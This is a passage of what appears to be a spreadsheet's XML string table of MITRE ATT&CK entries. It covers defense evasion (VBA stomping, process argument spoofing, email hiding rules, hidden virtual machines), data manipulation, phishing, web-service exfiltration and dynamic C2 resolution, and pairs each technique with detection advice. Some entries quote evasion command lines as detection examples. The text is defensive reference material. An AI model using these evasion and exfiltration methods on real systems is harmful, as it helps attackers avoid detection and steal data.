    <t>T1564.006</t>
  </si>
  <si>
    <t>Run Virtual Instance (T1564.006)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Image: Image Metadata, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)
Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)</t>
  </si>
  <si>
    <t>Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring the size of virtual machines running on the system. Adversaries may create virtual images which are smaller than those of typical virtual machines.(Citation: Shadowbunny VM Defense Evasion) Network adapter information may also be helpful in detecting the use of virtual instances.
Consider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a silent installation may be especially suspect (ex. &lt;code&gt;-silent&lt;/code&gt;, &lt;code&gt;-ignore-reboot&lt;/code&gt;), as well as those associated with running a headless (in the background with no UI) virtual instance (ex. &lt;code&gt;VBoxManage startvm $VM --type headless&lt;/code&gt;).(Citation: Shadowbunny VM Defense Evasion) Similarly, monitoring command line arguments which suppress notifications may highlight potentially malicious activity (ex. &lt;code&gt;VBoxManage.exe setextradata global GUI/SuppressMessages "all"&lt;/code&gt;).
Monitor for commands which enable hypervisors such as Hyper-V.  If virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for [Windows Service](https://attack.mitre.org/techniques/T1543/003), with respect to virtualization software. 
Benign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior.</t>
  </si>
  <si>
    <t>T1564.007</t>
  </si>
  <si>
    <t>VBA Stomping (T1564.007)</t>
  </si>
  <si>
    <t>File: File Metadata, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)
MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a &lt;code&gt;PerformanceCache&lt;/code&gt; that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the &lt;code&gt;_VBA_PROJECT&lt;/code&gt; stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)
An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the &lt;code&gt;_VBA_PROJECT&lt;/code&gt; stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)</t>
  </si>
  <si>
    <t>Detection efforts should be placed finding differences between VBA source code and p-code.(Citation: Walmart Roberts Oct 2018) VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler. The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code.(Citation: pcodedmp Bontchev)(Citation: oletools toolkit)
If the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed. However, if the &lt;code&gt;PROJECT&lt;/code&gt; stream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed. For example, adding a module name that is undefined to the &lt;code&gt;PROJECT&lt;/code&gt; stream will inhibit attempts of reading the VBA source code through the GUI.(Citation: FireEye VBA stomp Feb 2020)</t>
  </si>
  <si>
    <t>T1564.008</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Modification</t>
  </si>
  <si>
    <t>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 &lt;code&gt;New-InboxRule&lt;/code&gt; or &lt;code&gt;Set-InboxRule&lt;/code&gt; [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)
Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.
Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as &lt;code&gt;malware&lt;/code&gt;, &lt;code&gt;suspicious&lt;/code&gt;, &lt;code&gt;phish&lt;/code&gt;, and &lt;code&gt;hack&lt;/code&gt;) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)
In some environments, administrators may be able to enable email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conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).</t>
  </si>
  <si>
    <t>Monitor email clients and applications for suspicious activity, such as missing messages or abnormal configuration and/or log entries.
On Windows systems, monitor for creation of suspicious inbox rules through the use of the &lt;code&gt;New-InboxRule&lt;/code&gt; and &lt;code&gt;Set-InboxRule&lt;/code&gt; PowerShell cmdlets.(Citation: Microsoft BEC Campaign) On MacOS systems, monitor for modifications to the &lt;code&gt;RulesActiveState.plist&lt;/code&gt;, &lt;code&gt;SyncedRules.plist&lt;/code&gt;, &lt;code&gt;UnsyncedRules.plist&lt;/code&gt;, and &lt;code&gt;MessageRules.plist&lt;/code&gt; files.(Citation: MacOS Email Rules)</t>
  </si>
  <si>
    <t>T1564.009</t>
  </si>
  <si>
    <t>Resource Forking (T1564.009)</t>
  </si>
  <si>
    <t>Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using &lt;code&gt;ls -l@&lt;/code&gt; or &lt;code&gt;xattr -l&lt;/code&gt; commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the &lt;code&gt;/Resources&lt;/code&gt; folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)
Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)</t>
  </si>
  <si>
    <t xml:space="preserve">Identify files with the &lt;code&gt;com.apple.ResourceFork&lt;/code&gt; extended attribute and large data amounts stored in resource forks. 
Monitor command-line activity leveraging the use of resource forks, especially those immediately followed by potentially malicious activity such as creating network connections. </t>
  </si>
  <si>
    <t>T1564.010</t>
  </si>
  <si>
    <t>Process Argument Spoofing (T1564.010)</t>
  </si>
  <si>
    <t>Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)
Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) &lt;code&gt;WriteProcessMemory()&lt;/code&gt; function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)
Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)
This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.</t>
  </si>
  <si>
    <t>Detection of process argument spoofing may be difficult as adversaries may momentarily modify stored arguments used for malicious execution. These changes may bypass process creation detection and/or later process memory analysis. Consider monitoring for [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), which includes monitoring for process creation (especially those in a suspended state) as well as access and/or modifications of these processes (especially by the parent process) via Windows API calls.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)
Analyze process behavior to determine if a process is performing actions it usually does not and/or do no align with its logged command-line arguments.</t>
  </si>
  <si>
    <t>T1564.011</t>
  </si>
  <si>
    <t>Ignore Process Interrupts (T1564.011)</t>
  </si>
  <si>
    <t>Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.(Citation: Linux Signal Man)  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. 
Adversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue) This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.
Hiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.</t>
  </si>
  <si>
    <t>T1564.012</t>
  </si>
  <si>
    <t>File/Path Exclusions (T1564.012)</t>
  </si>
  <si>
    <t>Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)
Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.</t>
  </si>
  <si>
    <t>T1565</t>
  </si>
  <si>
    <t>File: File Creation, File: File Deletion, File: File Metadata, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution</t>
  </si>
  <si>
    <t>Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.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</si>
  <si>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Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data.</t>
  </si>
  <si>
    <t>T1565.001</t>
  </si>
  <si>
    <t>Stored Data Manipulation (T1565.001)</t>
  </si>
  <si>
    <t>File: File Creation, File: File Deletion, File: File Modification</t>
  </si>
  <si>
    <t>Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.
Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data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</si>
  <si>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Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values.</t>
  </si>
  <si>
    <t>T1565.002</t>
  </si>
  <si>
    <t>Transmitted Data Manipulation (T1565.002)</t>
  </si>
  <si>
    <t>Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution</t>
  </si>
  <si>
    <t>Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.
Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism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</si>
  <si>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 xml:space="preserve">Detecting the manipulation of data as at passes over a network can be difficult without the appropriate tools. In some cases integrity verification checks, such as file hashing, may be used on critical files as they transit a network. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data. </t>
  </si>
  <si>
    <t>T1565.003</t>
  </si>
  <si>
    <t>Runtime Data Manipulation (T1565.003)</t>
  </si>
  <si>
    <t>File: File Creation, File: File Deletion, File: File Metadata, File: File Modification, Process: OS API Execution</t>
  </si>
  <si>
    <t>Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.
Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect.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</si>
  <si>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Inspect important application binary file hashes, locations, and modifications for suspicious/unexpected values.</t>
  </si>
  <si>
    <t>T1566</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, File: File Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Identity Provider, Linux, Office Suite, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t>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Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools,(Citation: cyberproof-double-bounce) or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., "thread hijacking").(Citation: phishing-krebs)
Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)</t>
  </si>
  <si>
    <t>Network intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.
Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)
URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.
Because most common third-party services used for phishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.
Anti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Many possible detections of follow-on behavior may take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.</t>
  </si>
  <si>
    <t>T1566.001</t>
  </si>
  <si>
    <t xml:space="preserve">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attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.
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how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. </t>
  </si>
  <si>
    <t>Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.
Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)
Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.
Monitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)</t>
  </si>
  <si>
    <t>T1566.002</t>
  </si>
  <si>
    <t>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Spearphishing may also involve social engineering techniques, such as posing as a trusted source.
All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.
Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an "IDN homograph attack").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)
Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)
Adversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through “consent phishing” into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)
Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)</t>
  </si>
  <si>
    <t>URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites as well as links redirecting to adversary infrastructure based by upon suspicious OAuth patterns with unusual TLDs.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021). Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.
Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)
Because this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.</t>
  </si>
  <si>
    <t>T1566.003</t>
  </si>
  <si>
    <t>Spearphishing via Service (T1566.003)</t>
  </si>
  <si>
    <t>Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. 
All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.
A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.</t>
  </si>
  <si>
    <t>Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. 
Anti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.</t>
  </si>
  <si>
    <t>T1566.004</t>
  </si>
  <si>
    <t>Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.
All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Software](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)
Adversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)</t>
  </si>
  <si>
    <t>T1567</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.
Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.</t>
  </si>
  <si>
    <t>Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.</t>
  </si>
  <si>
    <t>T1567.001</t>
  </si>
  <si>
    <t>Exfiltration to Code Repository (T1567.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.
Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. </t>
  </si>
  <si>
    <t>Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.</t>
  </si>
  <si>
    <t>T1567.002</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.
Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. </t>
  </si>
  <si>
    <t>Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.</t>
  </si>
  <si>
    <t>T1567.003</t>
  </si>
  <si>
    <t>Exfiltration to Text Storage Sites (T1567.003)</t>
  </si>
  <si>
    <t>Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as &lt;code&gt;pastebin[.]com&lt;/code&gt;, are commonly used by developers to share code and other information.  
Text storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)
**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.</t>
  </si>
  <si>
    <t>T1567.004</t>
  </si>
  <si>
    <t>Exfiltration Over Webhook (T1567.004)</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.(Citation: RedHat Webhooks) Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. 
Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks Repository Webhooks) Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.(Citation: Microsoft SQL Server)
Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos Discord Webhook Abuse)(Citation: Checkmarx Webhooks)</t>
  </si>
  <si>
    <t>T1568</t>
  </si>
  <si>
    <t>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These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.
Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)</t>
  </si>
  <si>
    <t>Detecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more (Citation: Data Driven Security DGA). CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.</t>
  </si>
  <si>
    <t>T1568.001</t>
  </si>
  <si>
    <t>Fast Flux DNS (T1568.001)</t>
  </si>
  <si>
    <t>Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)
The simplest, "single-flux" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)
In contrast, the "double-flux" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.</t>
  </si>
  <si>
    <t>In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.</t>
  </si>
  <si>
    <t>T1568.002</t>
  </si>
  <si>
    <t>Domain Generation Algorithms (T1568.002)</t>
  </si>
  <si>
    <t>Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
